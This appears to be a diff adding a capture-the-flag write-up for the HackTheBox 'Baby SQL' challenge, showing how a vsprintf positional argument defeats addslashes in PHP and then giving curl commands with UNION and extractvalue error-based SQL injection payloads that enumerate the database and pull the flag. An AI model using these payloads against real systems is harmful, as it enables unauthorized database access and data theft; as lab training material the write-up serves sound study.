@@ -1,0 +1,25 @@
+<<<<<<<<<<<<<<<<<<<<<<Bypass addslashes function with vsprintf on Javascript : HackTheBox Baby SQL>>>>>>>>>>>>>>>>>>>>>>>>>
+
+First, we can open our terminal and enter php interactive mode:
+>php -a
+
+Inside, we can test out how to bypass addslahes:
+php> echo vsprintf("Hello %s, my name is %1$\a",['admin']);
+Hello admin, my name is a
+
+Find out the number of columns of the database:
+> curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$') UNION SELECT 1,2;#"
+Now, we know there's 2 columns
+
+Refer to http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html for methods.
+
+Getting the Current Database:
+> curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select database())))#"
+
+Getting tables in current Database:
+> curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))#"
+Now, we know there's a table name totally_not_a_flag
+
+Getting the flag:
+> curl -XPOST http://165.232.41.211:30934/ -d "pass=%1$') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT * FROM totally_not_a_flag)))#"
+And now, we'll get our flag :)
